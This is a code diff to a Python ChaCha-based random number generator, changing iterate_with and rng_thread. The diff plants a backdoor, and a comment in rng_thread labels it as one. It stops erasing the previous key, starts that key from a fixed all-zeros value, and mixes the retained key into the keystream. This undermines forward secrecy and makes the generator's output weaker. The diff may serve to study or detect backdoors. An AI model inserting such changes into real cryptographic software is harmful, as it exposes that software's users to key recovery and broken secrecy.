@@ -87,7 +87,7 @@ def ChaChaMe(key,nonce,plaintext):
     return cipher.encrypt(plaintext)
 
 
-def iterate_with(key,plaintext,itercount,prediction_resistant,spare):
+def iterate_with(key,plaintext,itercount,prediction_resistant,spare,prevkey):
     '''
         Iteratively reencrypt a keyset with itself - itercount iterations
     
@@ -112,13 +112,13 @@ def iterate_with(key,plaintext,itercount,prediction_resistant,spare):
         
         # Trigger the encryption
         plaintext = ChaChaMe(key,nonce,plaintext)
-        keystr = xor_bytes(key+key,plaintext)
+        keystr = xor_bytes(key+prevkey,plaintext)
         
         if i == mutate_point and spare:
             # Mutate the key using some of the "spare" data from the last key generation round
             newkey = xor_bytes(key,spare[32:])
-            del key
             del spare
+            prevkey = key
             key = newkey
             del newkey
         
@@ -182,13 +182,15 @@ def rng_thread(initial_seed,seed_queue,data_queue,reseed_interval):
     key,plaintext=split_seed(initial_seed)
     start=time.time()
     spare=False
+    prevkey='00000000000000000000000000000000'.encode('utf-8')
     
     while True:
         # Set off the initial iteration (48 iterations)
-        buffer1, plaintext = iterate_with(key,plaintext,48,prediction_resistant,spare)
+        buffer1, plaintext = iterate_with(key,plaintext,48,prediction_resistant,spare,prevkey)
 
         # Clear the original and then use the first 2 entries to create the next key
-        del key
+        # backdoor - keep a copy of the previous key
+        prevkey = key
         key,spare=select_key_from_bytes(buffer1[0],buffer1[2])
         
         # Clear some space on the queue if necessary
